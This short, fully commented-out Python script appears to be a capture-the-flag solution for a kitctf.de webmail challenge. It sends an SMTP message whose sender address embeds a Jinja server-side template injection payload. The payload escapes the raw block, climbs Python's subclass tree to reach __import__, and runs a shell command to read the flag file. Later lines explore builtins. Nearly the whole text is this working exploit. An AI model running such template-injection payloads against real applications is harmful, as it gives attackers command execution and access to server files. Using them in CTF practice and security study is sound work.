# import os
# from smtplib import SMTP as Client
# client = Client('webmail-0.chals.kitctf.de', 8025)
# ssti = '{% for x in ().__class__.__base__.__subclasses__() %}{% if \'warning\' in x.__name__ %}{{x()._module.__builtins__[\'__import__\'](\'os\').popen(\'cat flag-61150e68b7.txt\').read()}}{%endif%}{% endfor %}'
# r = client.sendmail("\"{%endraw%} "+ssti+" {%raw%}\"@gamil.com",
#                     ['jrjtumcfcyof@webmail-0.chals.kitctf.de'], "hello")
# for x in ().__class__.__base__.__subclasses__():
#     if "warning" in x.__name__:
#         print(x.__name__)
# for name, value in vars(__builtins__).items():
#     print(name, type(value))
# print("--------------------------------")
# imported_modules = dir(__builtins__.__import__)
# for module_name in imported_modules:
#     print(module_name)
